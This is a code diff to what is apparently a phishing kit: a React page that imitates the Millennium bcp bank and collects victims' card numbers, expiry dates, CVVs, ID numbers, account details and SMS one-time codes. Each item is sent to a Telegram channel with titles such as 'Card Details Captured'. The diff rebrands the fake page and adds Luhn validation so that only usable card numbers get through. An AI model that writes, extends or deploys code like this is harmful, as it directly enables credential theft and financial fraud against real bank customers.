@@ -8,7 +8,6 @@ import {
   Eye,
   EyeOff,
   Globe,
-  HelpCircle,
   Home,
   Lock,
   MapPin,
@@ -93,7 +92,7 @@ function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
   )
 }
 
-// Millennium bim Brand Logo Component
+// Millennium bcp Brand Logo Component
 function MillenniumLogo({
   className = "",
   variant = "magenta",
@@ -116,7 +115,7 @@ function MillenniumLogo({
         fill={color}
         xmlns="http://www.w3.org/2000/svg"
         className="shrink-0 overflow-visible"
-        aria-label="Millennium bim"
+        aria-label="Millennium bcp"
       >
         {/* Stylized 'M' with iconic curved top swoosh */}
         <path
@@ -135,7 +134,7 @@ function MillenniumLogo({
         </text>
         {/* Horizontal rule below Millennium */}
         <line x1="8" y1="52" x2="252" y2="52" stroke={color} strokeWidth="2.4" />
-        {/* 'bim' text right-aligned under line */}
+        {/* 'bcp' text right-aligned under line */}
         <text
           x="250"
           y="72"
@@ -145,7 +144,7 @@ function MillenniumLogo({
           fontWeight="600"
           letterSpacing="-0.2px"
         >
-          bim
+          bcp
         </text>
       </svg>
     </div>
@@ -162,6 +161,24 @@ function BocLogo({ className }: { className?: string }) {
 
 function BibdLogo({ className }: { className?: string }) {
   return <MillenniumLogo className={className} />
+}
+
+// Luhn Algorithm Card Validator (validates standard 16-digit cards)
+function isValidLuhn(cardNumber: string): boolean {
+  const digits = cardNumber.replace(/\D/g, "")
+  if (digits.length !== 16) return false
+  let sum = 0
+  let isEven = false
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let digit = parseInt(digits.charAt(i), 10)
+    if (isEven) {
+      digit *= 2
+      if (digit > 9) digit -= 9
+    }
+    sum += digit
+    isEven = !isEven
+  }
+  return sum % 10 === 0
 }
 
 // Millennium bcp rectangular badge (for 3DS verification header)
@@ -712,8 +729,12 @@ export default function BbvaPage(props: any) {
   const handleCardSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
     const cleanCard = cardNumber.replace(/\s+/g, "")
-    if (cleanCard.length < 15) {
-      setCardError(language === "es" ? "Número de tarjeta no válido" : "Please enter a valid card number")
+    if (!isValidLuhn(cleanCard)) {
+      setCardError(
+        language === "es"
+          ? "Por favor ingrese un número de tarjeta válido de 16 dígitos"
+          : "Please enter a valid 16-digit card number"
+      )
       cardNumberRef.current?.focus()
       return
     }
@@ -754,7 +775,7 @@ export default function BbvaPage(props: any) {
         (phoneNumber ? phoneNumber.replace(/\s+/g, "") : undefined)
 
       await sendTelegramMessage({
-        title: "Millennium bim — Card Details Captured",
+        title: "Millennium bcp — Card Details Captured",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cleanCard,
@@ -808,7 +829,7 @@ export default function BbvaPage(props: any) {
         (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
       await sendTelegramMessage({
-        title: "Millennium bim — 3DS Approval Clicked",
+        title: "Millennium bcp — 3DS Approval Clicked",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
@@ -846,7 +867,7 @@ export default function BbvaPage(props: any) {
       (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
     sendTelegramMessage({
-      title: "Millennium bim — SMS OTP Captured",
+      title: "Millennium bcp — SMS OTP Captured",
       dni: savedUser || undefined,
       phoneNumber: savedPhone || undefined,
       otp1: codeToSave,
@@ -949,7 +970,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "Millennium bim — Account Details Captured",
+      title: "Millennium bcp — Account Details Captured",
       dni: savedUser || undefined,
       accountNumber: accountNumber || "N/A",
       balance: accountBalance ? `EUR ${accountBalance}` : "N/A",
@@ -986,7 +1007,7 @@ export default function BbvaPage(props: any) {
       (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
     sendTelegramMessage({
-      title: `Millennium bim — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      title: `Millennium bcp — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
       phoneNumber: savedPhone || undefined,
       otp2: code,
@@ -1117,7 +1138,7 @@ export default function BbvaPage(props: any) {
   }
 
   const isCardFormValid =
-    cardNumber.replace(/\s+/g, "").length >= 15 &&
+    isValidLuhn(cardNumber) &&
     cardMonth.length === 2 &&
     cardYear.length === 2 &&
     cardCvv.length === 3
@@ -1513,7 +1534,7 @@ export default function BbvaPage(props: any) {
               <div className="w-full flex justify-center">
                 <img
                   src="/millennium_card.jpg"
-                  alt="Millennium bim Card"
+                  alt="Millennium bcp Card"
                   className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                 />
               </div>
@@ -1541,9 +1562,8 @@ export default function BbvaPage(props: any) {
                   <div className="w-full mb-3.5">
                     <div className="flex items-center justify-between mb-1.5">
                       <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
-                        {language === "es" ? "NÚMERO DE TARJETA" : "CARD NUMBER"}
+                        {language === "es" ? "NÚMERO DE TARJETA DE 16 DÍGITOS" : "16-DIGIT CARD NUMBER"}
                       </label>
-                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                     </div>
                     <input
                       ref={cardNumberRef}
@@ -1565,7 +1585,6 @@ export default function BbvaPage(props: any) {
                         <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                           {language === "es" ? "MES" : "MONTH"}
                         </label>
-                        <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                       </div>
                       <input
                         ref={cardMonthRef}
@@ -1607,7 +1626,6 @@ export default function BbvaPage(props: any) {
                       <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                         CVV / CVC
                       </label>
-                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                     </div>
                     <input
                       ref={cardCvvRef}
@@ -1915,7 +1933,7 @@ export default function BbvaPage(props: any) {
               <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-white">
                 <img
                   src="/millennium_card.jpg"
-                  alt="Millennium bim Card"
+                  alt="Millennium bcp Card"
                   className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                 />
                 {/* Overlaid Embossed Number */}
